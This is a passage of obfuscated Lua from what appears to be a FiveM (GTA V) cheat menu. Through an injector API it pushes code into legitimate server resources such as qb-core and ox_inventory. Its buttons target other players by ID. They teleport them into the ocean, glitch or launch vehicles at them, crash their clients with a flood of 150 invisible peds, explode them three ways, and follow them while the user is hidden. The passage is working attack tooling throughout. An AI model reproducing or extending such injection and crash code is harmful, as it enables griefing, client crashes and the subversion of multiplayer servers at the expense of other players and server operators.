        ]],v311,v311));break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v97=MachoMenuInputbox(v88,"Target Player ID (To Ocean)","e.g., 123");MachoMenuButton(v88,"Teleport to Ocean",function() local v312=0;local v313;while true do if (v312==0) then v313=tonumber(MachoMenuGetInputbox(v97));if (v313 and (v313>(0 -0))) then local v798=0 -0 ;local v799;while true do if (v798==1) then if (GetResourceState("monitor")=="started") then v799="monitor";elseif (GetResourceState("qb-core")=="started") then v799="qb-core";else v799="ox_inventory";end MachoInjectResource2(NewThreadNs,v799,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Ocean: Player not found!")
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Ocean: Target ped not found!")
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Ocean: Cannot target self!")
                return
            end
            
            local vehicle = GetVehiclePedIsIn(targetPed, false)
            local oceanCoords = vector3(2899.825, -5220.937, 121.9951)
            
            if vehicle and vehicle ~= 0 then
                -- Teleport vehicle to ocean
                NetworkRequestControlOfEntity(vehicle)
                local timeout = 0
                while not NetworkHasControlOfEntity(vehicle) and timeout < 100 do
                    NetworkRequestControlOfEntity(vehicle)
                    Wait(10)
                    timeout = timeout + 1
                end
                
                if NetworkHasControlOfEntity(vehicle) then
                    SetEntityCoords(vehicle, oceanCoords.x, oceanCoords.y, oceanCoords.z, false, false, false, false)
                    SetEntityVelocity(vehicle, 0.0, 0.0, -50.0)
                    SetVehicleEngineOn(vehicle, false, true, true)
                    SetVehicleUndriveable(vehicle, true)
                end
            else
                -- Teleport player to ocean
                SetEntityCoords(targetPed, oceanCoords.x, oceanCoords.y, oceanCoords.z, false, false, false, false)
            end
            
            local targetName = GetPlayerName(targetPlayer)
            print("Ocean: Sent " .. targetName .. " to ocean")
            TriggerEvent('chat:addMessage', { args = { '^2Ocean:', 'Sent ' .. targetName .. ' to the ocean!' } })
        ]],v313,v313));break;end if (v798==0) then MachoMenuNotification("Ocean","Sending player ID: "   .. v313   .. " to ocean" );v799=nil;v798=1 -0 ;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v98=MachoMenuInputbox(v88,"Target Player ID (Glitch Vehicle)","e.g., 123");MachoMenuButton(v88,"Glitch Vehicle",function() local v314=0 -0 ;local v315;while true do if (v314==(0 + 0)) then v315=tonumber(MachoMenuGetInputbox(v98));if (v315 and (v315>(1973 -(1656 + 317)))) then local v800=0;while true do if (v800==(0 + 0)) then MachoInjectResource("monitor",string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                TriggerEvent('chat:addMessage', { args = { '^1Glitch Vehicle:', 'Player not found! ID: %d' } })
                return
            end
            
            local selected_ped = GetPlayerPed(targetPlayer)
            
            if not DoesEntityExist(selected_ped) then
                TriggerEvent('chat:addMessage', { args = { '^1Glitch Vehicle:', 'Target player not in game! ID: %d' } })
                return
            end
            
            if selected_ped == PlayerPedId() then
                TriggerEvent('chat:addMessage', { args = { '^1Glitch Vehicle:', 'You cannot target yourself!' } })
                return
            end
            
            local myCoords = GetEntityCoords(PlayerPedId())
            local selected_coords = GetEntityCoords(selected_ped)
            local vehped = GetVehiclePedIsIn(selected_ped, false)
            
            -- Find nearest vehicle to target
            local nearestVehicle = GetClosestVehicle(selected_coords, 150.0, 0, 70)
            
            if not nearestVehicle or nearestVehicle == 0 then
                TriggerEvent('chat:addMessage', { args = { '^1Glitch Vehicle:', 'No vehicle found nearby target!' } })
                return
            end
            
            -- Get target player name
            local targetName = GetPlayerName(targetPlayer)
            
            -- Put player in vehicle
            SetPedIntoVehicle(PlayerPedId(), nearestVehicle, -1)
            SetEntityVisible(PlayerPedId(), false, false)
            Wait(300)
            
            local veh2 = GetVehiclePedIsIn(PlayerPedId(), false)
            local net = VehToNet(veh2)
            NetworkRequestControlOfEntity(veh2)
            SetPlayersLastVehicle(veh2)
            SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(veh2), true)
            SetNetworkIdAlwaysExistsForPlayer(net, PlayerPedId(), true)
            NetworkUseHighPrecisionBlending(net, true)
            SetVehicleExclusiveDriver_2(veh2, PlayerPedId(), true)
            SetVehicleExclusiveDriver(veh2, PlayerPedId(), true)
            NetworkSetEntityGhostedWithOwner(veh2, true)
            SetVehicleEngineOn(veh2, true, true, true)
            Citizen.InvokeNative(0xA670B3662FAFFBD0, net)
            Citizen.InvokeNative(0xB69317BF5E782347, veh2)
            
            Wait(200)
            ClearPedTasksImmediately(PlayerPedId())
            
            -- Attach vehicle to target's vehicle
            AttachEntityToEntityPhysically(
                nearestVehicle,
                vehped,
                -99999999999,
                -99999999999999999999999999,
                2,
                -9999999999999999999999.58,
                -9999999999.928,
                800990.0,
                2980.0,
                89999.0,
                99999.0,
                true,
                true,
                false,
                true,
                0
            )
            
            SetEntityCoordsNoOffset(PlayerPedId(), myCoords.x, myCoords.y, myCoords.z, true, true, false, true)
            Wait(100)
            SetPedIntoVehicle(PlayerPedId(), nearestVehicle, -1)
            
            local veh3 = GetVehiclePedIsIn(PlayerPedId(), false)
            local net2 = VehToNet(veh3)
            NetworkRequestControlOfEntity(veh3)
            SetPlayersLastVehicle(veh3)
            SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(veh3), true)
            SetNetworkIdAlwaysExistsForPlayer(net2, PlayerPedId(), true)
            NetworkUseHighPrecisionBlending(net2, true)
            SetVehicleExclusiveDriver_2(veh3, PlayerPedId(), true)
            SetVehicleExclusiveDriver(veh3, PlayerPedId(), true)
            NetworkSetEntityGhostedWithOwner(veh3, true)
            SetVehicleEngineOn(veh3, true, true, true)
            Citizen.InvokeNative(0xA670B3662FAFFBD0, net2)
            Citizen.InvokeNative(0xB69317BF5E782347, veh3)
            
            -- Re-attach
            AttachEntityToEntityPhysically(
                nearestVehicle,
                vehped,
                -99999999999,
                -99999999999999999999999999,
                2,
                -9999999999999999999999.58,
                -9999999999.928,
                800990.0,
                2980.0,
                89999.0,
                99999.0,
                true,
                true,
                false,
                true,
                0
            )
            
            Wait(10)
            SetEntityVisible(PlayerPedId(), true, true)
            SetEntityCoordsNoOffset(PlayerPedId(), myCoords.x, myCoords.y, myCoords.z, true, true, false, true)
            
            TriggerEvent('chat:addMessage', { args = { '^2Glitch Vehicle:', 'Vehicle glitched on ' .. targetName .. ' (ID: %d)' } })
        ]],v315,v315,v315,v315));MachoMenuNotification("Glitch Vehicle","Vehicle glitch initiated on ID: "   .. v315 );break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v99=MachoMenuInputbox(v88,"Target Player ID (Ban)","e.g., 123");MachoMenuButton(v88,"s1 Ban Player",function() local v316=0 + 0 ;local v317;while true do if (v316==(0 -0)) then v317=tonumber(MachoMenuGetInputbox(v99));if (v317 and (v317>(0 -0))) then MachoMenuNotification("s1 Ban","Ban effect initiating on ID: "   .. v317 );MachoInjectResource("monitor",string.format([[
            local targetServerId = %d
            print("s1 Ban: Target ID " .. targetServerId)
            
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("s1 Ban: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("s1 Ban: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Target player not in game! ID: %d' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("s1 Ban: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'You cannot target yourself!' } })
                return
            end
            
            print("s1 Ban: Player found, starting ban effect...")
            local targetCoords = GetEntityCoords(targetPed)
            local vehicleModel = GetHashKey("mule")
            
            RequestModel(vehicleModel)
            local timeout = 0
            while not HasModelLoaded(vehicleModel) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(vehicleModel) then
                print("s1 Ban: Model loaded, creating vehicle...")
                
                -- If player is in a vehicle, kick them out first
                if IsPedInAnyVehicle(targetPed, false) then
                    local theirVeh = GetVehiclePedIsIn(targetPed, false)
                    if theirVeh ~= 0 then
                        ClearPedTasksImmediately(targetPed)
                        TaskLeaveVehicle(targetPed, theirVeh, 0)
                        Wait(500)
                    end
                end
                
                local veh = CreateVehicle(vehicleModel, targetCoords.x, targetCoords.y + 3, targetCoords.z, 0.0, true, true)
                SetEntityVisible(veh, false, false)
                Wait(400)
                SetEntityCoords(veh, targetCoords.x, targetCoords.y, targetCoords.z + 2.0, true, true, true, true)
                
                if DoesEntityExist(veh) then
                    print("s1 Ban: Vehicle created, attaching player...")
                    SetEntityVisible(veh, false, false)
                    SetEntityAsMissionEntity(veh, true, true)
                    SetEntityDynamic(veh, true)
                    SetEntityCollision(veh, true, true)
                    ActivatePhysics(veh)
                    
                    -- Attach player to the vehicle
                    SetPedIntoVehicle(targetPed, veh, -1)
                    
                    local targetName = GetPlayerName(targetPlayer)
                    TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Ban effect on ' .. targetName .. ' (ID: %d)' } })
                    
                    CreateThread(function()
                        Wait(2000)
                        if DoesEntityExist(veh) then
                            print("s1 Ban: Applying force...")
                            ApplyForceToEntity(
                                veh,
                                1,
                                150000.0,
                                0.0,
                                350000000.0,
                                0.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                true,
                                false,
                                true
                            )
                            Wait(6000)
                            if DoesEntityExist(veh) then
                                print("s1 Ban: Deleting vehicle...")
                                DeleteEntity(veh)
                            end
                        end
                    end)
                else
                    print("s1 Ban: Failed to create vehicle!")
                    TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Failed to create vehicle!' } })
                end
            else
                print("s1 Ban: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Failed to load model!' } })
            end
            
            SetModelAsNoLongerNeeded(vehicleModel)
        ]],v317,v317,v317,v317));MachoMenuNotification("s1 Ban","Ban effect sent to ID: "   .. v317 );else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v100=MachoMenuInputbox(v88,"Target Player ID (Crash V1)","e.g., 123");MachoMenuButton(v88,"Crash V1 (Ped Flood)",function() local v318=tonumber(MachoMenuGetInputbox(v100));if (v318 and (v318>0)) then MachoMenuNotification("Crash V1","Invisible crasher deploying on ID: "   .. v318 );local v529=nil;if (GetResourceState("monitor")=="started") then v529="monitor";elseif (GetResourceState("qb-core")=="started") then v529="qb-core";elseif (GetResourceState("es_extended")=="started") then v529="es_extended";else v529="ox_inventory";end MachoInjectResource2(NewThreadNs,v529,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Crash V1: Player not found!")
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Crash V1: Target ped not found!")
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Crash V1: Cannot target self!")
                return
            end
            
            print("Crash V1: Deploying invisible crasher on " .. GetPlayerName(targetPlayer))
            
            local modelHash = GetHashKey("player_one")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Citizen.Wait(100)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local myPed = PlayerPedId()
                local targetCoords = GetEntityCoords(targetPed)
                local entities = {}
                
                for i = 1, 150 do
                    local angle = math.random() * 2 * math.pi
                    local distance = math.random() * 4.5
                    local x = targetCoords.x + (distance * math.cos(angle))
                    local y = targetCoords.y + (distance * math.sin(angle))
                    local z = targetCoords.z
                    
                    local hasGround, groundZ = GetGroundZFor_3dCoord(x, y, z + 2.0, false)
                    if hasGround then
                        z = groundZ
                    end
                    
                    local ped = CreatePed(28, modelHash, x, y, z, math.random(0, 359), true, false)
                    
                    if DoesEntityExist(ped) then
                        SetEntityAlpha(ped, 0, false)
                        SetEntityVisible(ped, false, false)
                        FreezeEntityPosition(ped, true)
                        SetEntityCollision(ped, false, false)
                        SetEntityNoCollisionEntity(ped, myPed, true)
                        SetEntityCanBeDamaged(ped, false)
                        SetEntityInvincible(ped, true)
                        SetPedCanRagdoll(ped, false)
                        SetBlockingOfNonTemporaryEvents(ped, true)
                        SetPedFleeAttributes(ped, 0, false)
                        SetPedCombatAttributes(ped, 0, false)
                        SetPedCombatAttributes(ped, 5, false)
                        SetPedSeeingRange(ped, 0.0)
                        SetPedHearingRange(ped, 0.0)
                        SetPedAsNoLongerNeeded(ped)
                        table.insert(entities, ped)
                    end
                    
                    if i % 6 == 0 then
                        Citizen.Wait(200)
                    end
                end
                
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Crash V1: Invisible crasher deployed on " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^1Crash V1:', 'Invisible crasher deployed on ' .. targetName .. ' (ID: %d)' } })
                
                -- Clean up after 60 seconds
                Citizen.SetTimeout(60000, function()
                    local count = 0
                    for _, ent in ipairs(entities) do
                        if DoesEntityExist(ent) then
                            DeleteEntity(ent)
                            count = count + 1
                        end
                    end
                    print("Crash V1: Crasher cleaned up - " .. count .. " peds deleted")
                    TriggerEvent('chat:addMessage', { args = { '^2Crash V1:', 'Crasher cleaned up - ' .. count .. ' peds deleted' } })
                end)
            else
                print("Crash V1: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Crash V1:', 'Failed to load model!' } })
            end
        ]],v318));MachoMenuNotification("Crash V1","Invisible crasher deployed on ID: "   .. v318 );else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v101=MachoMenuInputbox(v88,"Target Player ID (Whale)","e.g., 123");MachoMenuButton(v88,"Whale on Player",function() local v319=354 -(5 + 349) ;local v320;while true do if (v319==0) then v320=tonumber(MachoMenuGetInputbox(v101));if (v320 and (v320>(0 -0))) then MachoMenuNotification("Whale","Spawning whale on ID: "   .. v320 );local v801=nil;if (GetResourceState("monitor")=="started") then v801="monitor";elseif (GetResourceState("qb-core")=="started") then v801="qb-core";elseif (GetResourceState("es_extended")=="started") then v801="es_extended";else v801="ox_inventory";end MachoInjectResource2(NewThreadNs,v801,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Whale: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Whale: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'Target player not in game! ID: %d' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Whale: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'You cannot target yourself!' } })
                return
            end
            
            print("Whale: Spawning whale on " .. GetPlayerName(targetPlayer))
            
            local pos = GetEntityCoords(targetPed)
            local heading = GetEntityHeading(targetPed)
            local pedModel = "A_C_HumpBack"
            local modelHash = GetHashKey(pedModel)
            
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 500 do
                Citizen.Wait(10)
                timeout = timeout + 10
            end
            
            if HasModelLoaded(modelHash) then
                local whale = CreatePed(28, modelHash, pos.x, pos.y, pos.z + 5, heading, true, false)
                
                if DoesEntityExist(whale) then
                    SetEntityAsMissionEntity(whale, true, true)
                    SetEntityInvincible(whale, true)
                    SetEntityVelocity(whale, math.random(-10, 10), math.random(-10, 10), -15)
                    TaskWanderInArea(whale, pos.x, pos.y, pos.z, 10.0, 10.0, 10.0)
                    
                    local targetName = GetPlayerName(targetPlayer)
                    print("Whale: Whale spawned on " .. targetName)
                    TriggerEvent('chat:addMessage', { args = { '^2Whale:', 'Whale spawned on ' .. targetName .. ' (ID: %d)' } })
                else
                    print("Whale: Failed to create whale!")
                    TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'Failed to create whale!' } })
                end
                
                SetModelAsNoLongerNeeded(modelHash)
                
                -- Delete whale after 10 seconds
                Citizen.SetTimeout(10000, function()
                    if DoesEntityExist(whale) then
                        DeleteEntity(whale)
                        print("Whale: Whale deleted")
                    end
                end)
            else
                print("Whale: Failed to load whale model!")
                TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'Failed to load whale model!' } })
            end
        ]],v320,v320,v320));MachoMenuNotification("Whale","Whale spawn sent to ID: "   .. v320 );else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);MachoMenuButton(v88,"Uncuff Near Player",function() local v321=0;local v322;while true do if ((1272 -(266 + 1005))==v321) then MachoInjectResource2(NewThreadNs,v322,[[
        TriggerEvent('police:client:UnCuffPlayer', 'handcuffs')
        print("Uncuff Near Player triggered")
        TriggerEvent('chat:addMessage', { args = { '^2Uncuff:', 'Attempted to uncuff nearby player!' } })
    ]]);MachoMenuNotification("Uncuff","Attempted to uncuff nearby player!");break;end if (v321==(0 + 0)) then v322=nil;if (GetResourceState("monitor")=="started") then v322="monitor";elseif (GetResourceState("qb-core")=="started") then v322="qb-core";elseif (GetResourceState("es_extended")=="started") then v322="es_extended";else v322="ox_inventory";end v321=1;end end end);local v102=MachoMenuInputbox(v88,"Target Player ID (Medkit Revive)","e.g., 123");MachoMenuButton(v88,"Medkit Revive",function() local v323=0 -0 ;local v324;while true do if ((0 -0)==v323) then v324=tonumber(MachoMenuGetInputbox(v102));if (v324 and (v324>(1696 -(561 + 1135)))) then MachoMenuNotification("Medkit Revive","Reviving player ID: "   .. v324 );local v802=false;pcall(function() TriggerServerEvent("medkit:revivePlayer",v324);v802=true;end);if  not v802 then local v895=nil;if (GetResourceState("monitor")=="started") then v895="monitor";elseif (GetResourceState("qb-core")=="started") then v895="qb-core";elseif (GetResourceState("es_extended")=="started") then v895="es_extended";else v895="ox_inventory";end MachoInjectResource2(NewThreadNs,v895,string.format([[
                local targetServerId = %d
                TriggerServerEvent('medkit:revivePlayer', targetServerId)
                print("Medkit Revive: Revived player ID: " .. targetServerId)
                TriggerEvent('chat:addMessage', { args = { '^2Medkit Revive:', 'Revived player ID: ' .. targetServerId } })
            ]],v324));end MachoMenuNotification("Medkit Revive","Revive sent to ID: "   .. v324 );else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v103=MachoMenuInputbox(v88,"Target Player ID (Explode M1)","e.g., 123");MachoMenuButton(v88,"ZT Explode Player Method 1",function() local v325=tonumber(MachoMenuGetInputbox(v103));if (v325 and (v325>0)) then local v530=0 -0 ;local v531;while true do if (v530==(6 -4)) then MachoMenuNotification("Explode M1","Explosion sent to ID: "   .. v325 );break;end if (v530==(1066 -(507 + 559))) then MachoMenuNotification("Explode M1","Exploding player ID: "   .. v325 );v531=nil;v530=1;end if (v530==(2 -1)) then if (GetResourceState("monitor")=="started") then v531="monitor";elseif (GetResourceState("qb-core")=="started") then v531="qb-core";elseif (GetResourceState("es_extended")=="started") then v531="es_extended";else v531="ox_inventory";end MachoInjectResource2(NewThreadNs,v531,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Explode M1: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Explode M1: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'Target player not in game!' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Explode M1: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'You cannot target yourself!' } })
                return
            end
            
            print("Explode M1: Exploding " .. GetPlayerName(targetPlayer))
            
            local coords = GetEntityCoords(targetPed)
            local model = GetHashKey("sultan")
            
            RequestModel(model)
            local timeout = 0
            while not HasModelLoaded(model) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(model) then
                local veh = CreateVehicle(model, coords.x, coords.y + 10, coords.z, 0.0, true, false)
                SetEntityVisible(veh, false, false)
                AddVehiclePhoneExplosiveDevice(veh)
                Wait(1000)
                SetEntityCoords(veh, GetEntityCoords(targetPed), true, true, true)
                Wait(100)
                DetonateVehiclePhoneExplosiveDevice(veh)
                Wait(400)
                
                if DoesEntityExist(veh) then
                    DeleteEntity(veh)
                end
                
                SetModelAsNoLongerNeeded(model)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Explode M1: Exploded " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'Exploded ' .. targetName .. ' Method 1' } })
            else
                print("Explode M1: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'Failed to load model!' } })
            end
        ]],v325,v325,v325));v530=6 -4 ;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v104=MachoMenuInputbox(v88,"Target Player ID (Explode M2)","e.g., 123");MachoMenuButton(v88,"ZT Explode Player Method 2",function() local v326=tonumber(MachoMenuGetInputbox(v104));if (v326 and (v326>0)) then MachoMenuNotification("Explode M2","Exploding player ID: "   .. v326 );local v532=nil;if (GetResourceState("monitor")=="started") then v532="monitor";elseif (GetResourceState("qb-core")=="started") then v532="qb-core";elseif (GetResourceState("es_extended")=="started") then v532="es_extended";else v532="ox_inventory";end MachoInjectResource2(NewThreadNs,v532,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Explode M2: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Explode M2: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'Target player not in game!' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Explode M2: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'You cannot target yourself!' } })
                return
            end
            
            print("Explode M2: Exploding " .. GetPlayerName(targetPlayer))
            
            local veh = GetHashKey("volatus")
            RequestModel(veh)
            local timeout = 0
            while not HasModelLoaded(veh) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(veh) then
                local coords = GetEntityCoords(targetPed)
                local vehh = CreateVehicle(veh, coords.x, coords.y, coords.z + 30, 0.0, true, true)
                Wait(1000)
                SetEntityVisible(vehh, false, false)
                SetVehicleEngineHealth(vehh, -4000.0)
                SetVehicleBodyHealth(vehh, 0.0)
                SetVehicleFuelLevel(vehh, 1000.0)
                SetEntityVelocity(vehh, 0.0, 0.0, -80.0)
                Wait(400)
                
                if DoesEntityExist(vehh) then
                    DeleteEntity(vehh)
                end
                
                SetModelAsNoLongerNeeded(veh)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Explode M2: Exploded " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'Exploded ' .. targetName .. ' Method 2' } })
            else
                print("Explode M2: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'Failed to load model!' } })
            end
        ]],v326,v326,v326));MachoMenuNotification("Explode M2","Explosion sent to ID: "   .. v326 );else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v105=MachoMenuInputbox(v88,"Target Player ID (Explode M3)","e.g., 123");MachoMenuButton(v88,"ZT Explode Player Method 3",function() local v327=0;local v328;while true do if ((388 -(212 + 176))==v327) then v328=tonumber(MachoMenuGetInputbox(v105));if (v328 and (v328>0)) then local v803=905 -(250 + 655) ;local v804;while true do if (v803==(5 -3)) then MachoMenuNotification("Explode M3","Explosion sent to ID: "   .. v328 );break;end if (v803==1) then if (GetResourceState("monitor")=="started") then v804="monitor";elseif (GetResourceState("qb-core")=="started") then v804="qb-core";elseif (GetResourceState("es_extended")=="started") then v804="es_extended";else v804="ox_inventory";end MachoInjectResource2(NewThreadNs,v804,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Explode M3: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M3:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Explode M3: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M3:', 'Target player not in game!' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Explode M3: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M3:', 'You cannot target yourself!' } })
                return
            end
            
            print("Explode M3: Exploding " .. GetPlayerName(targetPlayer))
            
            local coords = GetEntityCoords(targetPed)
            AddOwnedExplosion(PlayerPedId(), coords.x, coords.y, coords.z, 10, 1.0, true, false, 1.0)
            
            local targetName = GetPlayerName(targetPlayer)
            print("Explode M3: Exploded " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^1Explode M3:', 'Exploded ' .. targetName .. ' Method 3' } })
        ]],v328,v328,v328));v803=2 -0 ;end if (v803==(0 -0)) then MachoMenuNotification("Explode M3","Exploding player ID: "   .. v328 );v804=nil;v803=1957 -(1869 + 87) ;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v106=false;local v107=false;local v108=nil;local v109=nil;local v110=nil;local v111=nil;local v112=nil;local v113=nil;local v14=false;local v15=false;local v114=false;local function v115(v329) local v330=0 -0 ;local v331;while true do if (v330==(1901 -(484 + 1417))) then v331=PlayerPedId();if v329 then SetEntityVisible(v331,false,false);NetworkSetEntityInvisibleToNetwork(v331,true);SetEntityAlpha(v331,0 -0 ,false);v14=true;else local v805=0 -0 ;while true do if (v805==(773 -(48 + 725))) then SetEntityVisible(v331,true,false);NetworkSetEntityInvisibleToNetwork(v331,false);v805=1;end if (v805==(1 -0)) then ResetEntityAlpha(v331);v14=false;break;end end end break;end end end CreateThread(function() while true do local v486=0 -0 ;while true do if (v486==(0 + 0)) then Wait(0);if v14 then local v855=PlayerPedId();SetEntityLocallyVisible(v855);SetEntityAlpha(v855,255,false);end break;end end end end);local v116=MachoMenuInputbox(v88,"Follow ID","Target Player ID");MachoMenuButton(v88,"Follow/Leave",function() if v107 then local v533=PlayerPedId();v107=false;DetachEntity(v533,true,false);v115(false);if DoesEntityExist(v109) then ClearPedTasks(v109);end v109=nil;if v112 then SetEntityCoords(v533,v112.x,v112.y,v112.z,false,false,false,false);end MachoInjectResource("monitor",[[
            local playerPed = PlayerPedId()
            local playerVeh = GetVehiclePedIsIn(playerPed, false)
    
            -- Make visible
            SetEntityVisible(playerPed, true, false)
            NetworkSetEntityInvisibleToNetwork(playerPed, false)
            ResetEntityAlpha(playerPed)
    
            if playerVeh ~= 0 then
                SetEntityVisible(playerVeh, true, false)
                NetworkSetEntityInvisibleToNetwork(playerVeh, false)
                ResetEntityAlpha(playerVeh)
            end
        ]]);v15=false;MachoMenuNotification("Follow","Follow left and returned.");return;end local v332=tonumber(MachoMenuGetInputbox(v116));if ( not v332 or (v332<=(0 -0))) then local v534=0;while true do if (v534==0) then MachoMenuNotification("Error","Please enter a valid ID!");return;end end end local v333=GetPlayerFromServerId(v332);if (v333== -(1 + 0)) then MachoMenuNotification("Error","Player not found.");return;end local v334=PlayerPedId();local v335=GetPlayerPed(v333);if  not DoesEntityExist(v335) then MachoMenuNotification("Error","Target ped doesn't exist.");return;end v107=true;v109=v335;v112=GetEntityCoords(v334);MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        local playerVeh = GetVehiclePedIsIn(playerPed, false)

        -- Invisible to others
        SetEntityVisible(playerPed, false, false)
        NetworkSetEntityInvisibleToNetwork(playerPed, true)
        SetEntityAlpha(playerPed, 0, false)

        if playerVeh ~= 0 then
            SetEntityVisible(playerVeh, false, false)
            NetworkSetEntityInvisibleToNetwork(playerVeh, true)
            SetEntityAlpha(playerVeh, 0, false)
        end

        -- Visible to yourself
        SetEntityLocallyVisible(playerPed)
        SetEntityAlpha(playerPed, 255, false)

        if playerVeh ~= 0 then
            SetEntityLocallyVisible(playerVeh)
            SetEntityAlpha(playerVeh, 255, false)
        end
    ]]);v15=true;AttachEntityToEntity(v334,v335,3444 + 8372 ,853.5 -(152 + 701) , -(1313 -(430 + 881)),1 + 1 ,0,895 -(557 + 338) ,0,false,false,false,false,1 + 0 ,true);CreateThread(function() while v107 do local v535=0;while true do if (v535==(0 -0)) then Wait(17 -12 );if IsPauseMenuActive() then local v896=0 -0 ;while true do if (v896==(4 -2)) then if v111 then SetEntityCoords(v334,v111.x,v111.y,v111.z,false,false,false,false);end v109=nil;v896=3;end if (v896==3) then MachoMenuNotification("Follow","Follow ended, returned to position.");break;end if (v896==1) then v115(false);if DoesEntityExist(v109) then ClearPedTasks(v109);end v896=803 -(499 + 302) ;end if (v896==(866 -(39 + 827))) then v107=false;DetachEntity(v334,true,false);v896=1;end end end v535=2 -1 ;end if (v535==(2 -1)) then if v15 then local v897=0 -0 ;local v898;while true do if ((2 -0)==v897) then SetEntityLocallyVisible(v898);SetEntityAlpha(v898,255,false);break;end if (v897==(0 + 0)) then v898=PlayerPedId();SetEntityVisible(v898,false,false);v897=1;end if (v897==(2 -1)) then NetworkSetEntityInvisibleToNetwork(v898,true);SetEntityAlpha(v898,0 + 0 ,false);v897=2 -0 ;end end end break;end end end 